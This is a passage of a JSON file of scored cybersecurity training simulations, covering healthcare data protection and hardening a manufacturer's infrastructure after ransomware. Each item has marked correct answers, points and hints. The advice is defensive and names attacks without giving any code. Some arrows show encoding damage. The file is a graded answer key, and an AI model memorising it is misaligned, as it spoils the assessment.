            "feedback": "{'short': \"BAA is required but doesn't protect data technically\", 'detailed': \"Business Associate Agreements are legally required for sharing PHI but provide contractual protection, not technical protection. The BAA obligates the recipient to protect data but doesn't prevent breaches at the recipient. Technical controls (IRM) protect data regardless of recipient's security posture.\", 'consequence': 'Legal protection but no technical protection. Recipient breach exposes NovaCare data.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "How can you maintain control over documents after they leave your organization?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Information Rights Management (IRM) encrypts documents with persistent protection - access control, usage restrictions, and revocation capability that follow the document."
          }
        ]
      },
      {
        "id": "decision_7",
        "sequence": 7,
        "title": "Certificate Management",
        "situation": "NovaCare has certificates for dozens of systems - web servers, EHR interfaces, email signing, and more. Last month, an expired certificate caused an EHR interface outage. You need to establish certificate management.\n\n**Question:** What is the most critical certificate management capability to implement first?",
        "options": [
          {
            "id": "A",
            "text": "Deploy internal Certificate Authority for all certificates",
            "feedback": "{'short': \"Internal CA is valuable but doesn't solve immediate problem\", 'detailed': \"Internal CA enables self-issuing certificates and control, but: doesn't address existing certificates already deployed, doesn't prevent expiration of current certs, and requires significant setup before value. The immediate problem is visibility and expiration tracking.\", 'consequence': 'Internal CA deployed but existing certificates still cause outages.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Certificate inventory and automated expiration monitoring",
            "feedback": "{'short': 'Correct! Know what you have and prevent expiration outages', 'detailed': \"Certificate discovery and monitoring addresses the immediate risks: inventory all certificates (know what exists), track expiration dates (30/60/90 day warnings), alert before expiration (prevent outages), and establish renewal workflows. This is the foundation for certificate management - you can't manage what you don't know exists.\", 'consequence': 'Certificate visibility achieved. Expiration outages prevented. Foundation for improvement.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Implement automated certificate renewal (ACME/Let's Encrypt)",
            "feedback": "{'short': 'Automation is valuable but you need inventory first', 'detailed': \"Automated renewal (ACME/Let's Encrypt for public certs) prevents expiration, but: only works for new certificates under automation, doesn't address existing certificates, and not all certs can use public CA (internal systems). First establish visibility, then automate.\", 'consequence': 'New certs automated but existing certs still at risk.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Hardware Security Module for certificate private keys",
            "feedback": "{'short': \"HSM protects keys but doesn't solve expiration problem\", 'detailed': \"HSM provides strong private key protection - important for high-security certificates. But HSM doesn't: discover existing certificates, track expiration, or prevent outages. HSM is a security enhancement, not a management solution.\", 'consequence': 'Key security improved but certificate outages continue.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "The recent outage was caused by certificate expiration. What prevents that specific problem?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Certificate lifecycle management starts with inventory (know what you have) and expiration monitoring (alert before problems)."
          }
        ]
      },
      {
        "id": "decision_8",
        "sequence": 8,
        "title": "Cloud Data Residency",
        "situation": "NovaCare is expanding Azure usage for analytics and some clinical applications. The compliance team asks about data residency - where will PHI be stored and processed? You need to define the cloud data residency approach.\n\n**Question:** What cloud data residency approach should NovaCare implement?",
        "options": [
          {
            "id": "A",
            "text": "No residency restrictions - use Azure global infrastructure for best performance",
            "feedback": "{'short': 'Uncontrolled residency creates compliance uncertainty', 'detailed': 'Without residency controls, data may be stored or processed in any Azure region: creates legal uncertainty (which laws apply?), makes compliance audits harder (where is data?), and may violate state laws or patient expectations. Healthcare data should have defined residency.', 'consequence': 'Data location unknown. Compliance uncertainty. Potential regulatory issues.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "US-only data residency with specific region configuration",
            "feedback": "{'short': 'Correct! Defined residency with appropriate controls', 'detailed': 'US-only residency provides: clear legal jurisdiction (US law applies), simplified compliance (HIPAA framework), patient expectations met (US healthcare), and audit clarity (data is in these regions). Configure Azure resources for specific US regions, disable geo-replication to other countries, and document residency controls for compliance.', 'consequence': 'Clear data location. Simplified compliance. Patient privacy expectations met.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Require all PHI to remain on-premises - no cloud for PHI",
            "feedback": "{'short': 'Overly restrictive - cloud can be HIPAA compliant', 'detailed': \"Cloud services can be HIPAA compliant with BAA (Azure offers this). Prohibiting cloud for PHI: limits clinical innovation, prevents beneficial analytics, and isn't required by regulations. The key is proper controls, not avoiding cloud entirely.\", 'consequence': 'Miss benefits of cloud analytics and modern tools. Not required by HIPAA.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Allow any country with adequate privacy laws",
            "feedback": "{'short': 'Creates complexity without clear benefit', 'detailed': \"Defining 'adequate' is complex and changing (is country X adequate?). Different laws apply in each country. For US healthcare, there's no benefit to international storage - US regions provide adequate capacity and performance. Adding international adds complexity without benefit.\", 'consequence': 'Added complexity. Multiple legal frameworks. No clear benefit.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What data residency approach provides clear legal framework and simplified compliance for US healthcare?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "US-only residency keeps data under US law, simplifies HIPAA compliance, and meets patient expectations. Configure cloud services to prevent international storage."
          }
        ]
      },
      {
        "id": "decision_9",
        "sequence": 9,
        "title": "Data Retention and Disposal",
        "situation": "NovaCare has no formal data retention policy. Some data goes back 20+ years, storage costs are rising, and there's concern about retaining data longer than necessary. Legal has requirements, but nothing is documented.\n\n**Question:** How should NovaCare approach data retention?",
        "options": [
          {
            "id": "A",
            "text": "Keep everything forever - storage is cheap and you never know what you'll need",
            "feedback": "{'short': 'Infinite retention increases risk and cost', 'detailed': 'Keeping everything forever means: ever-increasing breach exposure (more data = more breach impact), storage costs grow indefinitely, legal discovery costs increase (must search everything), and data quality degrades (outdated information). Data has a lifecycle and should be managed accordingly.', 'consequence': 'Massive data stores with unnecessary risk. Rising costs. Discovery nightmare.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Develop retention schedule based on legal, regulatory, and business requirements with secure disposal",
            "feedback": "{'short': 'Correct! Defined retention with proper disposal', 'detailed': \"Retention policy should define: minimum retention by data type (legal/regulatory requirements), maximum retention (don't keep longer than needed), defensible disposal process (document why data was deleted), and secure destruction (cryptographic erasure, physical destruction where needed). Healthcare has specific retention requirements (medical records, billing) that must be met.\", 'consequence': 'Appropriate retention. Risk reduced. Costs controlled. Defensible disposal.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Delete all data older than 7 years across the board",
            "feedback": "{'short': 'Blanket policy may violate retention requirements', 'detailed': \"Different data types have different requirements: medical records (varies by state, often 7-10 years after last treatment or longer for minors), billing (PCI 1 year, but legal may require longer), and research (per protocol, may be indefinite). A single policy doesn't fit all data types.\", 'consequence': 'May delete data required by law. May keep data longer than needed for other types.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Let individual departments decide retention for their data",
            "feedback": "{'short': 'Inconsistent retention creates compliance risk', 'detailed': 'Departmental discretion means: inconsistent retention, potential violation of legal requirements (department may not know requirements), no defensible disposal (why was this deleted?), and discovery complications. Retention requires enterprise policy with legal input.', 'consequence': 'Inconsistent practices. Compliance risk. No defensible position.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What balances legal requirements to retain data with risk reduction from limiting retention?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Retention schedule defines keep periods by data type. Meet minimums (legal), don't exceed maximums (risk), and document disposal (defensible)."
          }
        ]
      },
      {
        "id": "decision_10",
        "sequence": 10,
        "title": "Program Success Metrics",
        "situation": "Dr. Foster asks how you'll measure the data protection program's success. You need to define metrics that demonstrate value and drive continuous improvement.\n\n**Question:** What is the MOST important metric for measuring data protection program success?",
        "options": [
          {
            "id": "A",
            "text": "Number of DLP policies deployed",
            "feedback": "{'short': 'Activity metric, not outcome metric', 'detailed': \"Counting policies measures activity, not effectiveness. 100 policies mean nothing if they're not preventing data loss. Metrics should measure outcomes (incidents prevented, risk reduced) not just activities (policies deployed).\", 'consequence': 'Can show activity but not value. Policies may not be effective.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Percentage of sensitive data identified, classified, and protected",
            "feedback": "{'short': 'Correct! Coverage metric showing actual protection', 'detailed': \"This metric shows actual protection status: do you know where sensitive data is (identified)? Is it properly labeled (classified)? Are appropriate controls applied (protected)? This directly measures the program's core mission. Sub-metrics include: % PHI encrypted, % systems with DLP, % data with retention policy applied.\", 'consequence': 'Clear view of protection coverage. Identifies gaps. Demonstrates progress.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Number of data breaches",
            "feedback": "{'short': 'Important but lagging indicator', 'detailed': \"Breach count is the ultimate outcome but: it's a lagging indicator (measures failures after they occur), low numbers could mean good protection OR just no attacks yet, and doesn't show proactive improvement. Combine breach metrics with leading indicators like protection coverage.\", 'consequence': \"Know if you've failed but not if you're improving protection.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Training completion rate",
            "feedback": "{'short': 'Training is an input, not a protection metric', 'detailed': 'Training completion measures awareness activities, not protection effectiveness. People can complete training and still mishandle data. Training is necessary but not sufficient - measure whether data is actually protected, not just whether training occurred.', 'consequence': 'Know about training but not about actual data protection.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What metric directly measures whether sensitive data is actually protected?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Protection coverage (% of sensitive data with appropriate controls) measures the core mission. Combine with incident metrics for complete picture."
          }
        ]
      }
    ],
    "glossary": {},
    "outcomes": {},
    "max_score": 250,
    "passing_score": 150
  },
  {
    "id": "D3-SIM-004",
    "title": "Infrastructure Hardening",
    "domain": 3,
    "type": "SIM",
    "difficulty": "intermediate",
    "time_estimate": "45-60 minutes",
    "role": "Infrastructure Security Engineer",
    "organization": {
      "name": "Pacific Manufacturing Industries",
      "industry": "Manufacturing"
    },
    "introduction": "Pacific Manufacturing's ransomware incident exposed critical infrastructure weaknesses. The attackers exploited default configurations, legacy protocols, and a flat network to spread from a phished workstation to manufacturing systems in under 4 hours. As the Infrastructure Security Engineer, you're leading the remediation effort. Your challenge: harden systems, implement segmentation, and establish secure baselines without disrupting 24/7 manufacturing operations.",
    "learning_objectives": [
      "Given a scenario, apply security principles to secure enterprise infrastructure",
      "Compare and contrast security implications of different architecture models"
    ],
    "decision_points": [
      {
        "id": "decision_1",
        "sequence": 1,
        "title": "Secure Baseline Standard Selection",
        "situation": "Pacific has no documented security baselines - each plant and team configures systems differently. You need to establish a consistent baseline standard for all systems.\n\n**Question:** What secure baseline standard should Pacific adopt?",
        "options": [
          {
            "id": "A",
            "text": "Create custom baselines from scratch based on Pacific's needs",
            "feedback": "{'short': 'Reinventing the wheel without industry expertise', 'detailed': 'Creating baselines from scratch means: duplicating work already done by industry experts, likely missing important settings, no community validation or updates, and difficult to defend to auditors. Established baselines (CIS, STIG) represent collective industry wisdom and are regularly updated.', 'consequence': 'Gaps in baselines, no update process, difficult audit defense.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "CIS Benchmarks Level 1 with Level 2 for critical systems",
            "feedback": "{'short': 'Correct! Industry standard with appropriate rigor levels', 'detailed': 'CIS Benchmarks are industry standard, regularly updated, and provide two levels: Level 1 (essential security, minimal functionality impact) for most systems, Level 2 (defense in depth, may impact some functionality) for critical systems. This provides appropriate security without unnecessary operational impact. CIS also provides automated assessment tools.', 'consequence': 'Consistent baselines across organization. Industry-accepted standard. Audit-defensible.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "DISA STIGs for maximum security",
            "feedback": "{'short': 'STIGs are stricter than needed for non-DoD manufacturing', 'detailed': 'DISA STIGs are designed for Department of Defense systems with very high security requirements. For a manufacturing company, STIGs may be unnecessarily restrictive, cause operational issues, and require more exceptions. CIS Level 1/2 provides appropriate security without DoD-level restrictions.', 'consequence': 'Over-hardening causes operational issues. Many exceptions required. Unsustainable.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Vendor default configurations with basic security enabled",
            "feedback": "{'short': 'Defaults are not secure baselines', 'detailed': \"Vendor defaults prioritize ease of use over security. Default configurations typically: leave unnecessary services enabled, use weak settings, enable legacy protocols for compatibility, and don't implement defense-in-depth. This is what Pacific has now - and it contributed to the ransomware spread.\", 'consequence': 'No improvement over current insecure state.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What industry-standard baselines provide graduated security levels and are regularly updated?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "CIS Benchmarks: Level 1 for most systems (essential security), Level 2 for critical systems (defense in depth). Industry standard, regularly updated."
          }
        ]
      },
      {
        "id": "decision_2",
        "sequence": 2,
        "title": "Legacy Protocol Remediation",
        "situation": "The scan shows SMBv1 enabled on 78% of systems - this enabled the ransomware to spread via EternalBlue. IT argues some legacy systems require SMBv1. You need to decide the approach.\n\n**Question:** How should Pacific address SMBv1 across the environment?",
        "options": [
          {
            "id": "A",
            "text": "Disable SMBv1 everywhere immediately - security is paramount",
            "feedback": "{'short': 'May break critical systems without assessment', 'detailed': 'Immediate blanket disable may break: legacy applications, older network devices (printers, NAS), and some OT systems that require SMBv1. Critical manufacturing could stop. The right approach is to identify dependencies first, then disable with appropriate mitigations for exceptions.', 'consequence': 'Production outages from broken dependencies. Emergency rollback required.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Keep SMBv1 for compatibility - focus on other security improvements",
            "feedback": "{'short': 'SMBv1 is a critical vulnerability that enabled the attack', 'detailed': 'SMBv1 was the key propagation mechanism for the ransomware. Keeping it enabled maintains the exact vulnerability that caused the incident. EternalBlue and related vulnerabilities make SMBv1 a critical risk that must be addressed. Compatibility concerns require mitigation, not acceptance.', 'consequence': 'Ransomware attack vector remains open. Next attack will spread the same way.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Audit SMBv1 dependencies, disable where possible, isolate systems that require it",
            "feedback": "{'short': 'Correct! Risk-based approach with compensating controls', 'detailed': \"Audit first to identify what actually requires SMBv1 (usually less than expected). Disable on all systems that don't need it (majority). For systems that require it: isolate on separate network segment, apply additional monitoring, plan for replacement. This eliminates risk where possible and contains it where necessary.\", 'consequence': 'SMBv1 disabled on most systems. Remaining systems isolated and monitored. Risk significantly reduced.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Replace all systems that require SMBv1 before making changes",
            "feedback": "{'short': 'Takes too long - risk remains during replacement', 'detailed': 'Full replacement of legacy systems could take months or years and significant budget. During that time, SMBv1 remains enabled everywhere, maintaining the vulnerability. Disable where possible immediately, then work on replacing remaining legacy systems over time.', 'consequence': 'Extended exposure while waiting for replacements.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "How can you balance security (disabling SMBv1) with operational needs (some systems may require it)?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Audit to find actual dependencies, disable on most systems, isolate and monitor systems that require it as compensating control."
          }
        ]
      },
      {
        "id": "decision_3",
        "sequence": 3,
        "title": "IT/OT Segmentation Design",
        "situation": "The flat network allowed ransomware to spread from an IT workstation to OT systems in 4 hours. You need to design network segmentation between IT and OT environments.\n\n**Question:** What segmentation architecture should separate IT from OT?",
        "options": [
          {
            "id": "A",
            "text": "VLAN separation with routing between IT and OT",
            "feedback": "{'short': \"VLANs alone don't provide security filtering\", 'detailed': \"VLANs provide Layer 2 separation, but if you route between them without firewall rules, traffic flows freely. This is slightly better than flat network but doesn't provide the control needed between IT and OT. Security filtering at network boundaries is essential.\", 'consequence': 'Logical separation but traffic still flows. Attack could still spread.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Industrial DMZ (Purdue Model Level 3.5) with firewalls and controlled data exchange",
            "feedback": "{'short': 'Correct! Industry-standard OT security architecture', 'detailed': 'The Purdue Model with industrial DMZ (Level 3.5) provides: firewall-enforced boundary between IT and OT, controlled data exchange through DMZ services (historian mirror, jump server), no direct IT-to-OT traffic, and industry-standard architecture. Firewalls enforce strict rules on what can cross the boundary.', 'consequence': 'IT and OT properly separated. Controlled data exchange. Attack from IT cannot directly reach OT.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Complete air gap with no network connectivity between IT and OT",
            "feedback": "{'short': 'Air gap often impractical for modern manufacturing', 'detailed': \"Complete air gap provides strongest isolation but: prevents legitimate data flow (production data to ERP, remote monitoring), creates workarounds (USB drives - often worse security), and doesn't align with Industry 4.0 initiatives. Controlled connectivity through industrial DMZ is usually more practical.\", 'consequence': 'Operational inefficiency. USB workarounds create different risks.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Software-defined microsegmentation without network redesign",
            "feedback": "{'short': 'Microsegmentation is valuable but OT devices may not support agents', 'detailed': \"Software-defined microsegmentation requires agents on endpoints. Many OT devices (PLCs, HMIs, legacy systems) cannot run agents or the vendor won't support it. Network-based segmentation (firewalls) works regardless of endpoint capabilities. Microsegmentation complements but doesn't replace network segmentation for OT.\", 'consequence': 'IT endpoints protected but OT devices unprotected.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What industry-standard model provides security architecture for industrial control systems?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Purdue Model with industrial DMZ (Level 3.5): firewall-enforced IT/OT boundary, controlled data exchange, no direct IT-to-OT traffic."
          }
        ]
      },
      {
        "id": "decision_4",
        "sequence": 4,
        "title": "Endpoint Hardening Priority",
        "situation": "With 3,200 workstations and 280 servers to harden, you need to prioritize. Resources are limited, and you can't harden everything at once.\n\n**Question:** What endpoint hardening should be implemented FIRST?",
        "options": [
          {
            "id": "A",
            "text": "Full CIS benchmark hardening on all workstations",
            "feedback": "{'short': 'Good target but too broad for first priority', 'detailed': 'Full benchmark hardening is the end goal, but implementing everything on all workstations at once is risky (may break things) and slow (thorough testing needed). Start with high-impact quick wins while planning comprehensive hardening. The incident analysis shows specific issues to address first.', 'consequence': 'Long implementation timeline while high-impact risks remain.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Disable SMBv1, enable PowerShell logging, block Office macros - address attack vectors",
            "feedback": "{'short': 'Correct! Address specific attack vectors from the incident', 'detailed': 'Focus first on controls that would have prevented or detected the attack: SMBv1 disable (stopped propagation), PowerShell logging (detected Cobalt Strike), macro blocking (prevented initial execution). These high-impact changes can be deployed quickly and address known risks. Then continue with comprehensive hardening.', 'consequence': 'Specific attack vectors closed quickly. High-impact security improvement. Foundation for broader hardening.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Deploy EDR on all endpoints before hardening",
            "feedback": "{'short': 'EDR detects but hardening prevents - both needed', 'detailed': \"EDR provides detection and response capabilities - important! But EDR alone doesn't prevent vulnerabilities (SMBv1, macros). Hardening eliminates attack surface; EDR catches what gets through. Both are needed, but quick hardening wins can be faster than full EDR deployment.\", 'consequence': 'Can detect attacks but underlying vulnerabilities remain.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Focus on servers first - workstations are lower priority",
            "feedback": "{'short': 'Workstations are often the initial entry point', 'detailed': 'The attack started on a workstation (phishing). Servers are important, but workstations are typically the initial entry point for attacks. Hardening workstations (especially macro blocking, SMBv1 disable) addresses the attack chain start. A defense-in-depth approach addresses both.', 'consequence': 'Servers hardened but attack entry point (workstations) remains vulnerable.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What specific controls would have prevented or detected this particular attack?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Address attack chain: macros (initial execution), SMBv1 (propagation), PowerShell logging (detection). High-impact quick wins."
          }
        ]
      },
      {
        "id": "decision_5",
        "sequence": 5,
        "title": "Privileged Account Management",
        "situation": "Investigation revealed attackers harvested domain admin credentials from memory on a compromised workstation - the admin had logged in earlier for support. Shared admin accounts and poor privileged access hygiene enabled lateral movement.\n\n**Question:** What should be the FIRST step to improve privileged access security?",
        "options": [
          {
            "id": "A",
            "text": "Deploy full PAM solution with credential vaulting",
            "feedback": "{'short': 'PAM is valuable but takes months to deploy properly', 'detailed': 'Full PAM deployment (vaulting, session recording, JIT access) is the target state but requires significant implementation time. While planning PAM, immediate improvements can reduce risk now. The tiered model and LAPS can be implemented faster than full PAM.', 'consequence': 'Long deployment timeline while admin credential risks remain.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Implement tiered administration model - separate accounts, admins don't log into workstations",
            "feedback": "{'short': 'Correct! Immediately reduces credential exposure risk', 'detailed': 'Tiered administration provides immediate improvement: Tier 0 (domain admin) never logs into workstations or member servers, separate admin accounts per tier, domain admin credentials never exposed on lower-tier systems. This directly addresses how credentials were harvested. Can be implemented through policy and GPO while planning PAM deployment.', 'consequence': 'Credential exposure significantly reduced. Foundation for PAM deployment.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Require MFA for all admin accounts",
            "feedback": "{'short': \"MFA is important but doesn't address credential exposure\", 'detailed': \"MFA adds authentication security, but the issue was credential harvesting from memory (Pass-the-Hash, Mimikatz). Once attackers have the credential hash, they can use it directly without MFA in many scenarios (NTLM authentication). Tiered model prevents exposure; MFA adds a layer but doesn't solve the core issue.\", 'consequence': 'MFA deployed but credential exposure on workstations continues.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Change all admin passwords immediately",
            "feedback": "{'short': 'Passwords will be harvested again without architectural change', 'detailed': 'Password reset is incident response 101, but without changing the architecture, new passwords will be exposed the same way when admins log into workstations. The systemic issue (admins logging into untrusted systems) must be addressed, not just the credentials.', 'consequence': 'Passwords changed but same exposure continues. Will be compromised again.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "How can you prevent domain admin credentials from being exposed on workstations?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Tiered administration: Tier 0 admins only log into Tier 0 systems (DCs, PAWs). Credentials never exposed on workstations."
          }
        ]
      },
      {
        "id": "decision_6",
        "sequence": 6,
        "title": "OT System Hardening",
        "situation": "HMI systems on the plant floor are running Windows 7 Embedded with default vendor credentials. The vendor says hardening may void support. You need to balance security with operational requirements.\n\n**Question:** How should Pacific approach OT/HMI hardening?",
        "options": [
          {
            "id": "A",
            "text": "Don't harden - vendor support is essential for manufacturing",
            "feedback": "{'short': 'Unacceptable risk - OT was compromised in the attack', 'detailed': 'The ransomware reached OT systems. Accepting default credentials and no hardening maintains the vulnerability. Vendor support concerns are valid but can be addressed through negotiation and compensating controls. Security of production systems cannot be sacrificed for support.', 'consequence': 'OT remains vulnerable. Next attack will compromise manufacturing again.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Apply IT hardening standards to OT systems",
            "feedback": "{'short': 'IT standards may break OT functionality', 'detailed': 'OT systems have different requirements than IT: real-time operation, vendor-specific software, limited change windows. Standard IT hardening (patch Tuesday, aggressive GPO) may cause: application failures, safety system issues, vendor support problems. OT requires OT-specific approach.', 'consequence': 'Hardening breaks OT applications. Production impact.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Vendor-approved hardening where possible, compensating controls where not, negotiate with vendor",
            "feedback": "{'short': 'Correct! Balanced approach for OT environment', 'detailed': \"OT hardening approach: work with vendor to identify supported hardening (often more than expected), apply what's supported (credential changes, USB disable, local firewall), implement compensating controls for what's not (network isolation, monitoring, application whitelisting), and negotiate support terms. Document everything for both security and vendor relationships.\", 'consequence': 'OT security improved within vendor constraints. Compensating controls cover gaps.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Replace all OT systems with newer, securable versions",
            "feedback": "{'short': 'Long timeline and significant cost', 'detailed': 'OT system replacement is expensive ($millions for manufacturing equipment), takes years (planning, installation, validation), and may not be necessary if compensating controls are effective. Improve security now with hardening and controls while planning upgrades on normal lifecycle.', 'consequence': 'Years of exposure while planning replacement. Unnecessary cost if controls can mitigate.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "How can you improve OT security while maintaining vendor support and operational stability?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Work with vendors on supported hardening, implement compensating controls (network isolation, monitoring) for what can't be hardened, document everything."
          }
        ]
      },
      {
        "id": "decision_7",
        "sequence": 7,
        "title": "Hardening Rollout Strategy",
        "situation": "You've defined baselines and prioritized changes. Now you need to roll out hardening across 3,200 workstations and 280 servers without disrupting 24/7 manufacturing operations.\n\n**Question:** What rollout strategy should be used for hardening deployment?",
        "options": [
          {
            "id": "A",
            "text": "Deploy to all systems during a maintenance window",
            "feedback": "{'short': 'Big bang rollout is risky for this scale', 'detailed': \"Deploying to all 3,500 systems at once means: if something breaks, everything is impacted, difficult to identify which change caused issues, no time to respond before widespread impact, and manufacturing can't have 24/7 'maintenance window.' Too risky for critical operations.\", 'consequence': 'Widespread issues when problems discovered. Manufacturing disruption.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Phased rollout: test \u00e2\u2020\u2019 pilot \u00e2\u2020\u2019 waves with monitoring at each stage",
            "feedback": "{'short': 'Correct! Controlled rollout with validation gates', 'detailed': 'Phased approach provides safety: test in lab first (catch obvious issues), pilot on limited non-critical systems (real-world validation), then roll out in waves (10% \u00e2\u2020\u2019 25% \u00e2\u2020\u2019 50% \u00e2\u2020\u2019 100%) with monitoring between each stage. Problems caught early affect small groups, not entire organization. Manufacturing critical systems last, with extra validation.', 'consequence': 'Issues caught early. Minimal production impact. Validated changes.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "User-initiated: push to software center, let users install when convenient",
            "feedback": "{'short': \"Security baselines shouldn't be optional\", 'detailed': \"User-initiated deployment means: many systems never get hardened (users ignore or delay), inconsistent security posture, impossible to track compliance, and security requirements aren't optional. Hardening must be centrally deployed and enforced.\", 'consequence': 'Incomplete deployment. Ongoing vulnerability. Compliance failure.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Start with servers - they're more important and fewer in number",
            "feedback": "{'short': \"Reasonable prioritization but doesn't address deployment method\", 'detailed': 'Focusing on servers first is a valid prioritization decision, but the question is about HOW to deploy, not WHAT to deploy first. Servers still need phased rollout - deploying to all 280 servers at once carries risk. Phased approach applies regardless of target priority.', 'consequence': \"Server focus is fine but doesn't answer the deployment strategy question.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What deployment approach catches problems early before they become widespread?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Phased rollout: test (lab) \u00e2\u2020\u2019 pilot (limited production) \u00e2\u2020\u2019 waves (increasing scope) with monitoring gates between phases."
          }
        ]
      },
      {
        "id": "decision_8",
        "sequence": 8,
        "title": "Legacy System Decommissioning",
        "situation": "The assessment found 15% of workstations still running Windows 7 and servers running 2012 R2. IT says these support legacy applications. You need to address these unsupported systems.\n\n**Question:** How should Pacific handle end-of-support legacy systems?",
        "options": [
          {
            "id": "A",
            "text": "Allow continued use with signed risk acceptance from business owners",
